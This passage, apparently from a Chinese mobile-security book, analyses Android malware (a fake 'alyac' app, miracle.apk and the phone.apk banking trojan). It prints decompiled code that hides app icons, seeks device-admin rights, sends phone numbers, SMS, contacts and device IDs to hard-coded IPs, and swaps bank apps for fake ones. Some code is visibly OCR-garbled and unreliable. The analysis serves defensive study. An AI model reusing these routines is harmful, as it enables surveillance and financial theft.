android.permission.WRITE_EXTERNAL_STORAGE ['dangerous', 'modify/delete SD card contents', 'Allows an application to write to the SD card.']
android.permission.READ_CONTACTS ['dangerous', 'read contact data', 'Allows an application to read all of the contact (address) data stored on your phone. Malicious applications can use this to send your data to other people.']
android.permission.RECORD_AUDIO ['dangerous', 'record audio', 'Allows application to access the audio record path.']

在androapkinfo.py中查看到的API权限信息整理如下，加粗显示的是可能被恶意使用的API。

##### 用户权限（恶意App要求的权限信息）

android.permission.RECEIVE_SMS
android.permission.ACCESS_NETWORK_STATE
android.permission.RECEIVE_BOOT_COMPLETED
android.permission.READ_PHONE_STATE
android.permission.INTERNET
android.permission.SEND_SMS
android.permission.ACCESS_FINE_LOCATION
android.permission.ACCESS_COARSE_LOCATION
android.permission.ACCESS_MOCK_LOCATION
android.permission.WRITE_EXTERNAL_STORAGE
android.permission.VIBRATE
android.permission.FLASHLIGHT
android.permission.MOUNT_UNMOUNT_FILESYSTEMS
android.permission.CAMERA
android.permission.WAKE_LOCK
android.permission.RECORD_AUDIO
android.permission.PROCESS_OUTGOING_CALLS
android.permission.CALL_PHONE
android.permission.READ_CONTACTS

与alyac.apk文件的API权限比较后可以看出，多了下方的3个API权限。各权限功能如下。

□ android.permission.PROCESS_OUTGOING_CALLS：允许App监视去电信息。

□ android.permission.CALL_PHONE：允许App不通过设备界面即可拨打电话。

□ android.permission.READ_CONTACTS：允许App读取通讯录信息。

使用androidize.py查看获得权限的API正在调用哪些方法，结果如下。

PERM : READ_CONTACTS
R ['Android/provider/ContactsContract$CommonDataKinds$Phone;', 'CONTENT_URI', 'Android/net/Uri;'] (0x114) -->
Lkorean/alyac/view/Contacts;->getList(Android/content/Context; I)[[Ljava/lang/String;
PERM : CHANGE_COMPONENT_ENABLED_STATE
1 Lkorean/alyac/view/StartActivity;->onCreate(Android/os/Bundle;)V (0x3c) -->
Android/content/pm/PackageManager;->
setComponentEnabledSetting(Android/content/ComponentName; I I)V
PERM : READ_PHONE_STATE
1 Lkorean/alyac/view/BlockNumberService;->onCreate()V (0x1e) -->
Android/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;
1 Lkorean/alyac/view/PhoneCallReceiver;->
onReceive(Android/content/Context; Android/content/Intent;)V (0x36) -->
Android/telephony/TelephonyManager;->listen(Android/telephony/PhoneStateListen
er; I)V
1 Lkorean/alyac/view/PhoneCallReceiver;->
onReceive(Android/content/Context; Android/content/Intent;)V (0x50) -->
Android/telephony/TelephonyManager;->listen(Android/telephony/PhoneStateListen
er; I)V
1 Lkorean/alyac/view/SMSBroadcastReceiver;->getPhoneNumber(Android/content/Context
t;)Ljava/lang/String; (0x10) -->
Android/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;
1 Lkorean/alyac/view/SMSBroadcastReceiver;->
getdevicesid(Android/content/Context;)Ljava/lang/String; (0x12) -->
Android/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;
1 Lkorean/alyac/view/StartActivity;->run()V (0x18) -->
Android/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;
1 Lkorean/alyac/net/HttpUtils;->detect(Android/content/Context;)Z (0x20) -->
Android/net/ConnectivityManager;->getActiveNetworkInfo()
Android/net/NetworkInfo;
1 Lkorean/alyac/net/HttpUtils;->
buileClient()Lorg/apache/http/impl/client/DefaultHttpClient; (0x24) -->
Lorg/apache/http/impl/client/DefaultHttpClient;-><init>(Lorg/apache/http/params/
HttpParams;)V
1 Lkorean/alyac/net/HttpUtils;->postData(Ljava/lang/String;
Ljava/lang/String;)Ljava/lang/String; (0x48) -->
Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client
/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
1 Lkorean/alyac/net/HttpUtils;->
requestData(Ljava/lang/String;)Ljava/lang/String; (0x14) -->
Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client
/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
1 Lkorean/alyac/net/HttpUtils;->
requestData2(Ljava/lang/String;)Ljava/lang/String; (0x12) -->

Ljava/net/URL;->openConnection()
Ljava/net/URLConnection;
1 Lkorean/alyac/view/SMSBroadcastReceiver;->
sendPOSTRequest(Ljava/lang/String; Ljava/util/Map; Ljava/lang/String;)Z(0x64) -----> Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
1 Lkorean/alyac/net/HttpUtils;->
requestData2(Ljava/lang/String;)Ljava/lang/String; (0x48) ----->
Ljava/net/HttpURLConnection;->connect()V

与alyac.apk文件进行比较后可以看出，多了READ_CONTACTS。反编译恶意App后，将源文件与alyac.apk文件进行比较，结果如图4-63所示。

 </div>

此文件是修改正常文件而另外制作的。现在仔细查看源代码。

private void enableAdmin()
{
    Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
    localIntent.putExtra("android.app.extra.DEVICE_ADMIN", this.mDeviceAdmin);
    localIntent.putExtra("android.app.extra.ADD_EXPLANATION", "为了保护设备并保持App的正常运行，请选择如下设置。");
    startActivityForResult(localIntent, 1);
}

得到管理员权限后，使用`getLineNumber()`获取安装了恶意代码的手机号码。获取的电话号码会发送到http://126.114.226.49。

public void run()
{
    this.mTelephonyMgr = ((TelephonyManager)getSystemService("phone"));
    this.weiyi = this.mTelephonyMgr.getLine1Number();
    this.util = new HttpUtils();
    if (!TextUtils.isEmpty(this.weiyi))
    {
        this.url = ("http://126.114.226.49/" + "phone=" + this.weiyi + "&type=join");
        HttpUtils.requestData(this.url);
    }
    procThreadResult();
}

用WireShark查看上述代码发送的内容，如图4-64所示。

 </div>

查看从源代码获取的IP地址信息，内容如图4-65所示，位于日本。

 </div>

korean.alyac.view的SMSBroadcastReceiver类会使用getLine1Number()重新获取安装恶意App的手机号码。

private String getPhoneNumber(Context paramContext)
{
    return ((TelephonyManager)paramContext.getSystemService("phone").getLine1Number();
}

获取电话号码后，使用getDeviceId()获取设备ID。

public String getdevicesid(Context paramContext)
{
    TelephonyManager localTelephonyManager = (TelephonyManager)paramContext.getSystemService("phone");
    try
    {
        String str = localTelephonyManager.getDeviceId();
        return str;
    }
    catch (Exception localException)
    {
        return null;
    }
}

之后使用getOriginatingAddress()获取SMS去电号码, 使用getMessageBody()获取SMS短信内容。最后使用getTimestampMillis()获取SMS发送日期、时间等信息。将这些信息打包发送到http://126.114.226.49。

public void onReceive(Context paramContext, Intent paramIntent)
{
    if (!paramIntent.getAction().equals("android.provider.Telephony SMS_RECEIVED"))
        return;
    this.util = new HttpUtils();
    String str1 = getPhoneNumber(paramContext);
    String str2 = getdevicesid(paramContext);
    if (TextUtils.isEmpty(str1))
        this.weiyi = str2;
    while (true)
    {
        if (TextUtils.isEmpty(this.weiyi))
            this.weiyi = "";
        Object[] arrayOfObject =
            (Object[])paramIntent.getExtras().get("pdus");
        int i = arrayOfObject.length;
        int j = 0;
        label88: if (j >= i)
            break;
        SmsMessage localSmsMessage =
            SmsMessage.createFromPdu((byte[])arrayOfObject[j]);
        String str3 = localSmsMessage.getOriginatingAddress();
    }
}

String str4 = localSmsMessage.getMessageBody();
Date localDate = new Date(localSmsMessage.getTimestampMillis());
new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(localDate);
try
{
    if ((HttpUtils.detect(paramContext)) && (str3 != null) &&
                           ("".equals(str3)) && (str1 != null) && (!"".equals(str1)))
    {
        String str5 = URIEncoder.encode(str4, "UTF-8");
        this.url = ("http://126.114.226.49/" + "phone=" + this.weiyi +
                           "&send=" + str3 + "&surak=" + this.weiyi + "&memo=" + str5 + "&type=memo&xcode=1");
        HttpUtils.requestData2(this.url);
        this.url = ("http://126.114.226.49/" + "check.php?phone=" +
                           this.weiyi);
        if (!HttpUtils.requestData2(this.url).equals("219083"))
                           abortBroadcast();
    }
    j++;
    break label88;
    this.weiyi = str1;
}
catch (Exception localException)
{
    while (true)
    localException.printStackTrace();
}
procThreadResult();

使用WireShark查看发送到http://126.114.226.49的信息，如图4-66所示。

Follow IEP Stream

Stream Content
GET /?phone=15555215554&send=0815123456789&surak=15555215554&memo=Hello+World%21&type=memo&xcode=1 HTTP/1.1
User-Agent: Dalvik/1.4.0 (Linux; U; Android 2.3.4; generic Build/GRJ22)
Host: 126.114.226.49
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Wed, 29 May 2013 01:00:39 GMT
Server: Apache/1.3.34 (win32) PHP/4.4.2
X-Powered-By: PHP/4.4.2
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html

Follow ICP Stream
Stream Content
25
bool(true)]
2013-05-29 10:00:39------1
0

GET /check.php?phone=15555215554 HTTP/1.1
User-Agent: Dalvik/1.4.0 (Linux; U; Android 2.3.4; generic Build/GRJ22)
Host: 126.114.226.49
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Wed, 29 May 2013 01:00:40 GMT
Server: Apache/1.3.34 (win32) PHP/4.4.2
X-Powered-By: PHP/4.4.2
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html

0

 </div>

虽然源代码略有不同，但与alyac.apk文件的运行模式相同。下面是korean.alyac.view的Contacts类的内容。Contacts类会使用getList()函数获取安装了恶意代码的手机通讯录内容。

olic String[][] getList(Context paramContext, int paramInt1, int paramInt2)

ContentResolver localContentResolver = paramContext.getContentResolver();
String[] arrayOfString1 = { "id", "display_name", "has_phone_number" };
String str1 = "display_name COLLATE LOCALIZED ASC LIMIT " + String.valueOf paramInt1) + " OFFSET " + String.valueOf(paramInt2);
String[] arrayOfString2 = { "1" };
Cursor localCursor1 = localContentResolver.query(ContactsContract.Contacts.CONTENT_URI, arrayOfString1, "has_phone_number=?", arrayOfString2, str1);
String[][] arrayOfString = (String[][])Array.newInstance(String.class, new int[]);
localCursor1.getCount(), 4);
int i = 0;
if (!localCursor1.moveToNext())
{
    localCursor1.close();
    return arrayOfString;
}
String str2 =
    localCursor1.getString(localCursor1.getColumnIndex("_id"));
    arrayOfString[i][0] = str2;
    arrayOfString[i][1] =
        localCursor1.getString(localCursor1.getColumnIndex("display_name"));
    Cursor localCursor2 =
        localContentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id =?", new String[]{ str2 }, null);
    label212: Cursor localCursor3;
    if (!localCursor2.moveToNext())
    {
        localCursor2.close();
        localCursor3 = localContentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, "contact_id =?", new String[]{ str2 }, null);
        label252: if (localCursor3.moveToNext())
            break label360;
        localCursor3.close();
        if (isId(str2))
            break label386;
        InsertContacts(arrayOfString[i][0], arrayOfString[i][1], arrayOfString[i][2], arrayOfString[i][3]);
    }
    while (true)
    {
        i++;
        break;
    }

String str3 = localCursor2.getString(localCursor2.getColumnIndex("data1"))
.replace("-\", "");
arrayOfString[i][2] = str3.replace(" ", "");
break label212;
label360: arrayOfString[i][3] =
    localCursor3.getString(localCursor3.getColumnIndex("data1"));
break label252;
label386: updateContacts(arrayOfString[i][0], arrayOfString[i][1], arrayOfString[i]
[2], arrayOfString[i][3], null);
}

获取的通讯录内容会发送到http://126.114.226.49。使用WireShark查看发送http://126.114.226.49的信息，如图4-67所示。

 </div>

可参考下列URL。

http://developer.android.com/reference/android/Manifest.permission.html

之前收到的“钓鱼短信”大部分都使用“查看结算信息”作为诱饵，但现在会试图使用下列方式进行传播。

### 查看短链接信息：Automater

Automater会使用IPvoid.com、Robtex.com、Fortiguard.com、unshorten.me、Urvoid.com、Labs.alienvault.com等网站分析短链接，以判断是否为恶意网站。最近经常发生使用短链接诱

导用户访问恶意服务器的情况，使用这些工具提前检查也有利于安全。

下载：https://github.com/laN0rmus/TekDefense/blob/master/Automater.py

Automater从2013年3月22日开始添加到Kali Repository。可以使用“apt-getinstall automater”进行安装，不能安装时可以先运行“apt-get update”命令，然后即可正常安装。

root@kali:~# apt-get install automater
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following NEW packages will be installed:
    automater
0 upgraded, 1 newly installed, 0 to remove and 281 not upgraded.
Need to get 5,682 B of archives.
After this operation, 48.1 kB of additional disk space will be used.
Get:1 http://http.kali.org/kali/ kali/main automater i386 1.2-1kali1 [5,682 B]
Fetched.5,682 B in 12s (442 B/s)
Selecting previously unselected package automater.
(Reading database ... 257484 files and directories currently installed.)
Unpacking automater (from .../automater_1.2-1kali1_i386.deb) ...
Setting up automater (1.2-1kali1) ...

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>主要选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-h</td><td style='text-align: center; word-wrap: break-word;'>查看帮助文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-t TARGET、--target TARGET</td><td style='text-align: center; word-wrap: break-word;'>导出查询命令中的IP信息。只支持1个IP</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-f FILE、--file FILE</td><td style='text-align: center; word-wrap: break-word;'>用于导入包含IP或网址信息的文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-o OUTPUT、--output OUTPUT</td><td style='text-align: center; word-wrap: break-word;'>将结果输出并保存到文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-e EXPAND、--expand EXPAND</td><td style='text-align: center; word-wrap: break-word;'>使用unshort.me网站将短链接还原为原来的地址</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-s SOURCE、--source SOURCE</td><td style='text-align: center; word-wrap: break-word;'>用于使用特定引擎判断被分配的域。选项支持robtex、ipvoid、fortinet、urlvoid、alienvault</td></tr></table>

视频参考地址如下。
http://securabit.com/2013/04/11/securatip-episode-2-automater/

root@bt:~# python Automater.py -t dlvr.it/33jgxp

Welcome to Automater! I have created this tool to help analyst investigate IP Addresses and URLs with the common web based tools. All activity

is passive so it will not alert attackers.
Web Tools used are: IPvoid.com, Robtex.com, Fortiguard.com, unshorten.me, Urlvoid.com, Labs.alienvault.com
www.TekDefense.com

[*] Running URL toolset

[+] dlvr.it/33jgxp redirects to: https://www.owasp.org/index.php?

title=OWASP_Proactive_Controls&diff=147396&oldid=134451&utm_source=dlvr.it&_medium=twitter

Welcome to Automater! I have created this tool to help analyst investigate I Addresses and URLs with the common web based tools. All activity

is passive so it will not alert attackers.

Web Tools used are: IPvoid.com, Robtex.com, Fortiguard.com, unshorten.me,

Urlvoid.com, Labs.alienvault.com

www.TekDefense.com

@author: laNormus@TekDefense.com, Ian Ahl

Version 1.2

[*] w8.d78b.com is a URL.

[*] Running URL toolset

[-] w8.d78b.com is not a recognized shortened URL.

[+] Host IP Address is 115.88.3.52

[+] Host is listed in blacklist at http://global.sitesafety.trendmicro.com/

[+] Host is listed in blacklist at http://www.scumware.org/search.scumware

[+] Latitude / Longitude: 37 / 127.5

[+] Country: (KR) Korea, Republic of

[+] Domain creation date: 2013-03-16 (25 days ago)

[-] FortiGuard URL Categorization: Uncategorized

粗体部分使用“Host is listed in blacklist”显示可疑网址。下面分析执行重要功能的源代码。这是在file选项中选择robotex、ipvoid等相关引擎网站的部分。选择特定网站时，使用相关网站信息进行判断。

if args.target == None and args.file == None:
    parser.print_help()
    sys.exit(1)
    if args.source == "robtex":
        ipInput = str(args.target)
        print args.source + " source engine selected"
        robtex(ipInput)
    if args.source == "ipvoid":
        ipInput = str(args.target)
        print args.source + " source engine selected"
        ipvoid(ipInput)
    .. (中略)

查找不同网站函数时，可以看到各网站注册的地址被分到了哪个项目。下列源代码使用正则表达获取信息后，判断并显示相关网址是否收录于黑名单。

re.compile('Detected\<\/font\>\\\d..td..a.rel..nofollow..href.\{6,70\}\)\\\stitle=\\\"View', re.IGNORECASE)
rpdFind2 = re.findall(rpd2, content2String)
rpdSorted2 = sorted(rpdFind2)

rpd3 = 're.compile('ISP\<\/td\>\\<td\>'.+)\\\<\\/td\>', re.IGNORECASE)
rpdFind3 = re.findall(rpd3, content2String)
rpdSorted3 = sorted(rpdFind3)

rpd4 = re.compile('Country\sCode.+flag"\s/\>\s(.+)\<\/re.IGNORECASE)
rpdFind4 = re.findall(rpd4, content2String)
rpdSorted4 = sorted(rpdFind4)

for j in rpdSorted2:
    print ('[+] Host is listed in blacklist at ' + j)
    if j == '':
        print('[-] IP is not listed in a blacklist')

利用MD5散列值，以threatexpert、minotauranalysis、joesecurity等网站信息为依据，判断是否包含恶意功能。

url = "http://www.threatexpert.com/report.aspx?md5=" + md5
resp, content = h.request((url), "GET")
contentString = (str(content))
#print contentString
rpd = re.compile('Submission\sreceived.\s(+)\<\/li\>')
rpdFind = re.findall(rpd, contentString)

大部分开源工具会使用正在运行的服务或相关API制作可以实际应用的工具。

#### 4.2.3 分析miracle.apk恶意代码（发送设备信息）

miracle.apk使用图4-68所示的广告短信进行传播。虽然没有使用短链接，但通过手机换新活动诱导用户点击，这运用了社会工程学方法（从通信公司的非法换新活动就可以知道用户多么喜欢更换手机）。

 </div>

下表总结了恶意App的简要信息。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>内容</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>File name:</td><td style='text-align: center; word-wrap: break-word;'>miracle.apk</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MD5:</td><td style='text-align: center; word-wrap: break-word;'>121372b7c1b3b7395fc243074eb16ea3</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SHA-1:</td><td style='text-align: center; word-wrap: break-word;'>8d951a858214eeee7a31a55335bc76bacc8617d1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>File Size:</td><td style='text-align: center; word-wrap: break-word;'>40733字节</td></tr></table>

点击短信中的短链接就会下载miracle.apk文件。安装miracle.apk文件后会生成miracle图标，点击生成的图标就注册到设备管理器，如图4-69所示。

 </div>

注册到设备管理器后，应用程序列表中的miracle图标就会被删除，但程序依然在后台运行。miracle.apk会要求下列7项权限。

用户权限（User Permission）
android.permission.INTERNET
android.permission.READ_PHONE_STATE
android.permission.READ_SMS
android.permission.SEND_SMS

android.permission.RECEIVE_BOOT_COMPLETED

android.permission.RECEIVE_SMS

android.permission.WRITE_SETTINGS

7项权限中，加粗显示的是可能被恶意使用的权限。具体内容如下表所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>权限</td><td style='text-align: center; word-wrap: break-word;'>内容</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>android.permission.INTERNET</td><td style='text-align: center; word-wrap: break-word;'>允许App创建网络套接字</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>android.permission.READ_PHONE_STATE</td><td style='text-align: center; word-wrap: break-word;'>允许App读取手机状态。此时App可以收集电话号码、IMEI、通话状态等信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>android.permission.SEND_SMS</td><td style='text-align: center; word-wrap: break-word;'>允许App发送SMS信息。此时App未得到用户确认也可以发送短信</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>android.permission.READ_SMS</td><td style='text-align: center; word-wrap: break-word;'>允许App读取保存在SIM卡中的SMS信息。此时App可以读取私密短信</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>android.permission.RECEIVE_SMS</td><td style='text-align: center; word-wrap: break-word;'>允许App接收并处理SMS信息。此时恶意App可以监控用户短信，也可以在用户读取短信之前删除短信</td></tr></table>

下面是MainActivity类源代码的一部分。App运行后会使用getPackageManager().setComponentEnabledSetting删除应用程序列表中的图标，之后使用SharedPreferences保存UI状态，如图4-70所示。

Android系统可能会在内存不足的情况下随意挑选并强制关闭正在运行的App。重新运行因内存不足而被关闭的Activity和程序时，使用SharedPreferences恢复到关闭之前的状态。

 </div>

下面是RegDPMActivity类源代码的一部分。在RegDPMActivity类中使用DevicePolicyManager的isAdminActive查看设备管理器权限是否激活。如果设备管理器权限处于禁用状态，就会要求激活设备权限，如图4-71所示。

 </div>

图4-72是Util类源代码的一部分。Util类使用TelephonyManager获取Android手机信息。使用的TelephonyManager的方法有getLine1Number()、getSimSerialNumber()、getDeviceId()、getNetworkOperatorName()，各方法的功能是获取电话号码、序列号、设备ID、通信公司名称。

 </div>

 </div>

使用TelephonyManager获取的信息会发送到服务器，如图4-74和图4-75所示。

   </div>

public String doRegisterUser()
{
    String str1 = getPhonetNumber();
    String str2 = getTelCospany();
    if (str1.equals("")) {
        for (String str3 = ""; : str3 = HttpUtils.requestData2("http://118.25.1.59/index.php?type=join&telnus=" + str1 + "&telcompany=" + str2))
        return str3;
    }
}

 </div>

(Follow TCP Stream)

Stream Content
GET /index.php?type=join&telnum=15555215554&telcompany=Android HTTP/1.1
User-Agent: Dalvik/1.4.0 (Linux; U; Android 2.3.4; generic Build/GRJ22)
Host: 118.25.1.59
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Sun, 13 Oct 2013 16:17:23 GMT
Server: Apache
Content-Length: 2
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

ok

 </div>

下面是SMSBroadcastReceiver类源代码的一部分。SMSBroadcastReceiver会监视SMS信息，收到SMS信息时，使用Util类获取的电话号码，并告知服务器设备是否可以发送短信。如果可以发送SMS，就使用SmsMessage的getOriginatingAddress()获取发送SMS的电话号码。

之后使用SmsMessage的getMessageBody()函数收集SMS内容。收集到的SMS发送端电话号码和短信内容会与感染miracle.apk的设备电话号码一起打包发送到服务器。

public void onReceive(Context paramContext, Intent paramIntent)
{
    if (IparasIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"));
    String str1;
    do
    {
        return;
        str1 - new Util(parasContext).getPhone±usber();
    }
    while (str1 == null);
    Object|| arrayOfObject - (Object||)parasIntent.getExtras().get("pdus");
    int i - arrayOfObject.length;
    int j - 0;
    while (j < i)
    {
        SasMessage localSasMessage - SsMessage.createFromPdu((byte|))arrayOfObject|));
        String str2 - localSasMessage.getOriginatingAddress();
        String str3 - localSasMessage.getMessageBody();
        if (str2 != null);
        try
        {
            if ((1", equals(str2)) && (str1 != null) && ((1", equals(str1)))
            {
                if (HttpUtils.requestData2("http://118.25.1.59/." + "hp_getSnsblockstate.php?telnum=" + str1),equals("1"))
                abortBroadcast());
                String str4 - URLEncoder.encode(str3, "UTF-8");
                HttpUtils.requestData2("http://118.25.1.59/" + "index.php?type=receivesms&telnum=" + str1 + "&sender=" + str2 + "&memo=" + str4);
            }
        }
    }
}

 </div>

如图4-77所示，查看发送到服务器的数据包。设备的电话号码会保存到telnum值后发送到服务器。

 </div>

 </div>

查看从源代码获取的IP地址信息，如图4-79所示。此IP位于中国，已被屏蔽。

 </div>

   </div>

#### 4.2.4 分析phone.apk恶意代码（修改金融App）

此恶意代码的目的是窃取金融信息，会伪装成一个叫 “Phone World” 的卖手机的网络商店 App程序。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>内容</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>File name</td><td style='text-align: center; word-wrap: break-word;'>phone.apk</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MD5</td><td style='text-align: center; word-wrap: break-word;'>f5fd62f3d934210d99056311f78e918e</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SHA-1</td><td style='text-align: center; word-wrap: break-word;'>43aa59f0c775fdcfa9760474f7e8888d01f3b0a9</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>File Size</td><td style='text-align: center; word-wrap: break-word;'>663.5KB（679464字节）</td></tr></table>

用户被相关短信内容吸引而点击链接时，会移动到下列网站，并会下载文件名为phone.apk的恶意代码。现在此网站已被关闭。

 </div>

安装phone.apk后生成“★Phone World★”图标，如图4-81所示。点击此图标会显示手机商店，商店的内容与名为“Phone World”的在线手机商店的网站内容相同。

 </div>

phone.apk会要求如下23项权限，加粗显示的是可能被恶意使用的权限。

用户权限（User Permission）

android.permission.READ_LOGS
android.permission.PROCESS_OUTGOING_CALLS
android.permission.INTERNET
android.permission.WRITE_CONTACTS
android.permission.SEND_SMS
android.permission.ANSWER_PHONE
android.permission.ACCESS_NETWORK_STATE
android.permission.GET_TASKS
android.permission.DELETE_PACKAGES
android.permission.WRITE_EXTERNAL_STORAGE
android.permission.RECEIVE_BOOT_COMPLETED
android.permission.READ_CONTACTS
android.permission.INSTALL_PACKAGES
android.permission.CALL_PHONE
android.permission.READ_PHONE_STATE
android.permission.MODIFY_AUDIO_SETTINGS
android.permission.VIBRATE
android.permission.SYSTEM_ALERT_WINDOW
android.permission.ACCESS_WIFI_STATE
android.permission.WAKE_LOCK
android.permission.RECEIVE_SMS
android.permission.MODIFY_PHONE_STATE
android.permission.MOUNT_UNMOUNT_FILESYSTEMS

下面查看源代码。phone.apk也同样拥有获取手机号码等功能,此处只介绍几个最重要的功能。phone.apk的功能是删除正常的银行相关App,然后安装伪装成银行App以窃取金融信息的恶意App。下列代码使用ActivityManager的getRunningTasks()监视最近运行的App和正在运行的App。

public final boolean isPhoneViewShow(Context paramContext)
{
    ComponentName localComponentName = ((ActivityManager.RunningTaskInfo)
                          ((ActivityManager)paramContext.getSystemService("activity"))).getRunningTasks(2).get(0)).topActivity;
    return (localComponentName != null) &&
                          (("com.android.phone.InCallScreen".equals
                          (localComponentName.getClassName()) ||
                          ("com.android.phone.SemcInCallScreen".equals
                          (localComponentName.getClassName())));
}

使用ActivityManager的getRunningTasks()在最近运行的App或正在运行的App中找到韩亚银行、IBK企业银行、国民银行、NH农协、新韩银行、友利银行等正常App时，会使用如下代码提示相关程序推出了新版本。

if (str.equals("com.hanabank.ebk.channel.android.hananbank"))
{
    this.mainLayout.setBackgroundResource(2130837504);
    this.dialog_msg = "韩亚银行Nbank有新版本。";
}

this.dialog_title = "通知";
while (true)
{
    playTone();
    openDialog();
    return;
    if (str.equals("com.ibk.neobanking"))
    {
        this.mainLayout.setBackgroundResource(2130837505);
        this.dialog_msg = "IBK企业银行有新版本";
        this.dialog_title = "通知";
    }
    else if (str.equals("com.kbstar.kbbank"))
    {
        this.mainLayout.setBackgroundResource(2130837508);
        this.dialog_msg = "KB Star网银有新版本";
        this.dialog_title = "通知";
    }
    else if (str.equals("nh.smart"))
    {
        this.mainLayout.setBackgroundResource(2130837509);
        this.dialog_msg = "NH网银有新版本";
        this.dialog_title = "通知";
    }
    else if (str.equals("com.shinhan.sbanking"))
    {
        this.mainLayout.setBackgroundResource(2130837511);
        this.dialog_msg = "新韩S网银有新版本";
        this.dialog_title = "通知";
    }
    else if (str.equals("com.webcash.wooribank"))
    {
        this.mainLayout.setBackgroundResource(2130837512);
        this.dialog_msg = "OneTouch（个人）有新版本";
        this.dialog_title = "通知";
    }
}

用户点击更新按钮就会下载并安装恶意App，这与智能手机上的正常银行App同名（安全起见，匿名为xxx.xxx）。

"com.hanabank.ebk.channel.android.hananbank.app.

HanaIntro");
this.packageName = "com.hanabank.ebk.channel.android.hananbank";
this.className = "com.hanabank.ebk.channel.android.hananbank.app."
HanaIntro";
}
else if (str2.equals("com.ibk.neobanking"))
{
    this.url = "http://173.xxx.xxx.68/ibk.apk";
    this.comIntent.setClassName("com.ibk.neobanking", "com.ibk.neobanking.ui.Intro");
    ui.Intro");
    this.packageName = "com.ibk.neobanking";
    this.className = "com.ibk.neobanking.ui.Intro";
}
else if (str2.equals("com.webcash.wooribank"))
{
    this.url = "http://173.xxx.xxx.68/woori.apk";
    this.comIntent.setClassName("com.webcash.wooribank", "com.webcash.wooribank.Intro");
    this.packageName = "com.webcash.wooribank";
    this.className = "com.webcash.wooribank.Intro";
}
else if (str2.equals("com.kbstar.kbbank"))
{
    this.url = "http://173.xxx.xxx.68/kb.apk";
    this.comIntent.setClassName("com.kbstar.kbbank", "com.kbstar.kbbank.UI.Intro");
    this.packageName = "com.kbstar.kbbank";
    this.className = "com.kbstar.kbbank.UI.Intro";
}
else if (str2.equals("nh.smart"))
{
    this.url = "http://173.xxx.xxx.68/nh.apk";
    this.comIntent.setClassName("nh.smart", "nh.smart.menu.activity.MainMenu");
    this.packageName = "nh.smart";
    this.className = "nh.smart.menu.activity.MainMenu";
}
else
{
    if (!str2.equals("com.shinhan.sbanking"))
    break;
    this.url = "http://173.xxx.xxx.68xinhan.apk";
    this.comIntent.setClassName("com.shinhan.sbanking", "com.shinhan.bank.sbank.activity.main.IntroActivity");
    this.packageName = "com.shinhan.sbanking";
    this.className = "com.shinhan.bank.sbank.activity.main.IntroActivity";
}

恶意App下载完成后会强制删除之前的正常程序，然后安装恶意程序。这些恶意程序的是窃取金融信息，分析内容如下。

   </div>

之后下载的apk文件的功能都相同，分析其中名为kb.apk的apk文件。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>内容</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>File name</td><td style='text-align: center; word-wrap: break-word;'>kb.apk</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MD5</td><td style='text-align: center; word-wrap: break-word;'>1ef736f620a5e6e525cb992bd9ebe37c</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SHA-1</td><td style='text-align: center; word-wrap: break-word;'>ab11f4697e4ae97a59d0bfccad247837e46a3e06</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>File Size</td><td style='text-align: center; word-wrap: break-word;'>353.3KB（361763字节）</td></tr></table>

下载后的kb.apk要求如下用户权限。

用户权限（User Permission）
android.permission.SYSTEM_ALERT_WINDOW
android.permission.WRITE_EXTERNAL_STORAGE
android.permission.INTERNET
